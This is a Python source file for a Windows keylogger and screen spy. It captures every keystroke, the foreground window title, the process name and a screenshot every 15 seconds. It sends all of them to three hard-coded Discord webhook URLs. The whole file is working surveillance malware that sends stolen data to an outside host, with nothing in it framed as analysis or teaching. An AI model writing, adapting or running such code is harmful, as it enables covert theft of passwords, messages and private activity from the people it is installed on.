import base64
import win32api
import win32con
import win32gui
import win32ui
import win32process
import psutil
import os
import threading
import pynput
import pynput.keyboard
from pynput.keyboard import Key, Listener
import requests
import time

current_word = []

def on_press(key):
    global current_word
    try:
        key_pressed = str(key.char)
    except AttributeError:
        if key == pynput.keyboard.Key.enter:
            key_pressed = "\n"
            send_to_discord("[key.ENTER]")
        elif key == pynput.keyboard.Key.space:
            key_pressed = " "
        elif key == pynput.keyboard.Key.shift:
            key_pressed = ""
        else:
            key_pressed = f"[{key}]"

    if key_pressed != " ":
        current_word.append(key_pressed)

    if key_pressed == " " or key_pressed == "\n":
        if len(current_word) > 1:
            send_to_discord(' '.join(current_word))
        current_word = []

def get_dimensions():
    width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
    height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
    left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
    top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)
    return (width, height, left, top)

def screenshot():
    hdesktop = win32gui.GetDesktopWindow()
    width, height, left, top = get_dimensions()

    desktop_dc = win32gui.GetWindowDC(hdesktop)
    img_dc = win32ui.CreateDCFromHandle(desktop_dc)
    mem_dc = img_dc.CreateCompatibleDC()

    screenshot = win32ui.CreateBitmap()
    screenshot.CreateCompatibleBitmap(img_dc, width, height)
    mem_dc.SelectObject(screenshot)
    mem_dc.BitBlt((0,0), (width, height), img_dc, (left, top), win32con.SRCCOPY)
    screenshot.SaveBitmapFile(mem_dc, f'Screenshot.png')
    file_path = f'screenshot.png'
    send_to_discord2(file_path)
    os.remove(file_path)
    mem_dc.DeleteDC()
    win32gui.DeleteObject(screenshot.GetHandle())

def run():
    screenshot()
    with open('screenshot.png') as f:
        img = f.read()
    return img

def get_active_window():
    active_window = win32gui.GetForegroundWindow()
    window_title = win32gui.GetWindowText(active_window)
    return window_title

def get_active_process():
    active_window = win32gui.GetForegroundWindow()
    _,pid = win32process.GetWindowThreadProcessId(active_window)
    process = psutil.Process(pid)
    process_name = process.name()
    return process_name

def send_to_discord(key):
    url = "https://discord.com/api/webhooks/1309903363550478356/7TzOHTOlo6VOoinI0TumhhqziTIU5yYISUqaqU8EXg2wPTGUhZackDCTcciTvdOZ_a5V"
    data = {"content": key}
    requests.post(url, json=data)

def send_to_discord2(screenshot):
    with open('screenshot.png', 'rb') as img_file:
        url = "https://discord.com/api/webhooks/1310611632774189117/Oyh7gztcnUUZKRDnUH3JZ7_s1LSwJ41yhU6LJZ4eMsLUyQOkByyhE_ehCA1jWmqMSShY"
        data = {"file": ('screenshot.png', img_file, "image/png")}
        requests.post(url, files=data)

def send_to_discord3(window_title, process_name):
    url = "https://discord.com/api/webhooks/1310932271590670336/3UXiWRf_Jq1HlKlw4qssPd8QKpF86EbOb2oR7rTTAhoMRFuwwKIBKt6zeWOWxV8gE7vp"
    data = {"content" : f"{window_title}\nActive Process: {process_name}"}
    requests.post(url, json=data)

def screenshot_and_App_opening_tracker():
    while True:
        time.sleep(15)
        active_window = get_active_window()
        active_process = get_active_process()
        send_to_discord3(active_window, active_process)
        screenshot()

def main():
    listener_thread = threading.Thread(target=lambda: Listener(on_press=on_press).start())
    listener_thread.daemon = True
    listener_thread.start()

    screenshot_and_App_opening_tracker()

if __name__ == "__main__":
    main()
